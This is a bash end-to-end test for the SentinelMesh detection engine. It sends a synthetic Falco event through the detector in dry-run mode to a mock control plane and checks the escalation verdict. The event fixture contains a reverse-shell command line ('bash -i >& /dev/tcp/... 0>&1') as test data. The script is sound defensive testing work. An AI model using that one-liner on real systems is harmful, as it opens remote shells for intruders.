#!/usr/bin/env bash
set -euo pipefail
ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
TMP="$(mktemp -d)"
trap 'kill ${MOCK_PID:-0} ${DET_PID:-0} 2>/dev/null || true; rm -rf "$TMP"' EXIT

cat > "$TMP/mock_cp.py" <<'PY'
import json, sys
from pathlib import Path
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

out = Path(sys.argv[1])
class Handler(BaseHTTPRequestHandler):
    def log_message(self, *_): pass
    def do_POST(self):
        length = int(self.headers.get("Content-Length", "0"))
        body = self.rfile.read(length)
        rec = {
            "path": self.path,
            "api_key": self.headers.get("X-SentinelMesh-Api-Key", ""),
            "idempotency_key": self.headers.get("Idempotency-Key", ""),
            "body": json.loads(body),
        }
        out.write_text(json.dumps(rec, indent=2))
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(b'{"incident_id":"e2e-accepted","status":"CONTAINED"}')

ThreadingHTTPServer(("127.0.0.1", 18080), Handler).serve_forever()
PY
python3 "$TMP/mock_cp.py" "$TMP/result.json" &
MOCK_PID=$!

DETECTOR_BIN="${DETECTOR_BIN:-${ROOT}/detection-engine/bin/sentinelmesh-detector}"
if [[ ! -x "$DETECTOR_BIN" ]]; then
  mkdir -p "${ROOT}/detection-engine/bin"
  (cd "$ROOT/detection-engine" && go build -o bin/sentinelmesh-detector ./cmd/detector)
fi

cat > "$TMP/falco_event.json" <<'JSON'
{"time":"2026-10-08T00:00:00Z","rule":"e2e","priority":"critical","output":"e2e reverse shell","hostname":"e2e-host","tags":["e2e"],"output_fields":{"evt.type":"execve","proc.pid":99999,"proc.ppid":1234,"proc.exe":"/bin/bash","proc.cmdline":"bash -i >& /dev/tcp/10.20.30.40/4444 0>&1","proc.pname":"nginx","user.name":"e2e","fd.rip":"10.20.30.40","fd.rport":4444}}
JSON

(
  cd "$ROOT/detection-engine"
  RESPONSE_MODE=dry-run \
  CONTROL_PLANE_URL="http://127.0.0.1:18080" \
  CONTROL_PLANE_API_KEY=e2e-key \
  POLICY_SIGNING_KEY=e2e-policy-key \
  FALCO_HTTP_ADDR=127.0.0.1:18766 \
  FALCO_HTTP_PATH=/falco/events \
  METRICS_ADDR=127.0.0.1:22112 \
  LOCAL_AUDIT_LOG_PATH="$TMP/audit.log" \
  INCIDENT_SPOOL_DIR="$TMP/outbox" \
  timeout 6s "$DETECTOR_BIN" >"$TMP/detector.log" 2>&1 || true
) &
DET_PID=$!

for _ in $(seq 1 50); do
  python3 - "$TMP/falco_event.json" <<'PYHTTP' && break || true
import sys, urllib.request
body=open(sys.argv[1],'rb').read()
req=urllib.request.Request('http://127.0.0.1:18766/falco/events', data=body, method='POST', headers={'Content-Type':'application/json'})
try:
    with urllib.request.urlopen(req, timeout=0.15) as r:
        if r.status == 202:
            print('sent')
            raise SystemExit(0)
except Exception:
    pass
raise SystemExit(1)
PYHTTP
  sleep 0.1
done

for _ in $(seq 1 50); do
  [[ -f "$TMP/result.json" ]] && break
  sleep 0.1
done

[[ -f "$TMP/result.json" ]] || { echo "ERROR: no incident reached mock control-plane" >&2; cat "$TMP/detector.log" >&2; exit 1; }
[[ -f "$TMP/audit.log" ]] || { echo "ERROR: local P0 audit journal was not written" >&2; cat "$TMP/detector.log" >&2; exit 1; }
python3 - "$TMP/result.json" <<'PY'
import json, sys
from pathlib import Path
r=json.load(open(sys.argv[1]))
assert r["path"] == "/incidents"
assert r["api_key"] == "e2e-key"
assert r["idempotency_key"]
assert r["body"]["verdict"]["action"] == "escalate_to_reclaim"
assert r["body"]["verdict"]["score"] >= 0.95
assert Path(sys.argv[1]).exists()
print("E2E PASS: Falco HTTP JSON -> normalize -> deterministic detection -> dry-run containment -> incident transport")
PY
